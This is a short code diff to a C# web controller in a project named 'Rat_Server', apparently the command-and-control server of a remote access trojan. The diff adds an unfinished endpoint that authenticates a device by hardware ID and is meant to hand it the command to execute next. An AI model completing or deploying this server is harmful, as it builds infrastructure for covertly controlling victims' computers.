@@ -38,7 +38,7 @@ namespace Rat_Server.Controllers
                 return StatusCode(StatusCodes.Status403Forbidden);
             }
 
-            // Create a Device object that we'll use to add to the database
+            // Create a Device object that we'll add to the database
             Device device = new Device
             {
                 Hwid = new Guid(requestBody.Hwid),
@@ -51,6 +51,28 @@ namespace Rat_Server.Controllers
             _context.SaveChanges();
 
             return StatusCode(StatusCodes.Status201Created);
+        }
+
+        [HttpGet]
+        [ProducesResponseType(typeof(CurrentCommandDto), StatusCodes.Status200OK)]
+        [ProducesResponseType(StatusCodes.Status400BadRequest)]
+        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
+        public ActionResult<CurrentCommandDto> GetCurrentCommandForDevice([FromHeader] string Hwid)
+        {
+            // If the client didn't provide a Hwid, send back a Bad Request status code
+            if (!ModelState.IsValid)
+            {
+                return StatusCode(StatusCodes.Status400BadRequest);
+            }
+
+            // If the client's Hwid isn't registered, send back an Unauthorized status code
+            if(_context.Devices.Find(new Guid(Hwid)) == null)
+            {
+                return StatusCode(StatusCodes.Status401Unauthorized);
+            }
+
+            // TODO: Retrieve the current command that the device needs to execute
+            Command currentCommand;
         }
     }
 }
